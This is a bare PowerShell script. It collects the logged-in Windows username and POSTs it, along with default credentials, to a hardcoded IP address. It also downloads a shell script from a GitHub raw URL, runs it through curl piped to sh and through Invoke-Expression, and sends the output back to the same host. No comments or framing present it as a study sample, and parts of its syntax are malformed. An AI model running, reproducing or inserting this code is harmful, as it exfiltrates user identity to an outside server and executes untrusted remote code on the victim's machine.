$psVersion = $PSVersionTable.PSVersion

If ($psVersion -ge "3.0") {
	$username = $(Get-WMIObject -class Win32_ComputerSystem | select username).username
	
	$params = @{"data"=$username;}
	Invoke-RestMethod -Uri http://157.245.84.21/index.php -Method Post -Body $params -UseDefaultCredentials

} else {

	$username = $(Get-WMIObject -class Win32_ComputerSystem | select username).username

	$r = [System.Net.WebRequest]::Create("http://157.245.84.21/index.php")
	$r.Method = "POST"
	$r.UseDefaultCredentials = $true

	$r.ContentType = "application/x-www-form-urlencoded"

	$enc = [system.Text.Encoding]::UTF8
	$string1 = "data=" + $username
	$data1 = $enc.GetBytes($string1) 

	$r.ContentLength = $data1.Length
	$newStream = $r.GetRequestStream()
	$newStream.Write($data1,0,$data1.Length)
	$newStream.Close();

}


$scriptList= 
@($dload = curl -s https://raw.githubusercontent.com/billhemmer2789/food/main/macfood.sh | sh
)

foreach($script in $scriptList){
    Start-Process -FilePath "PSHOME\powershell.exe" -ArgumentList"-command'&$script'"-Wait
    $param2 = @{"data"=$dload;}
    Invoke-RestMethod -Uri http://157.245.84.21/index.php -Method Post -Body $param2 -UseDefaultCredentials

} 

$psV = $PSVersionTable.PSVersion

If ($psV -ge "3.0") {

    $dload = IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/billhemmer2789/food/main/macfood.sh');

	$r = [System.Net.WebRequest]::Create("http://157.245.84.21/index.php")
	$r.Method = "POST"
	$r.UseDefaultCredentials = $true

	$r.ContentType = "application/x-www-form-urlencoded"

	$enc = [system.Text.Encoding]::UTF8
	$string2 = "data=" + $dload
	$data2 = $enc.GetBytes($string2) 

	$r.ContentLength = $data2.Length
	$newStream = $r.GetRequestStream()
	$newStream.Write($data2,0,$data2.Length)
	$newStream.Close();
}
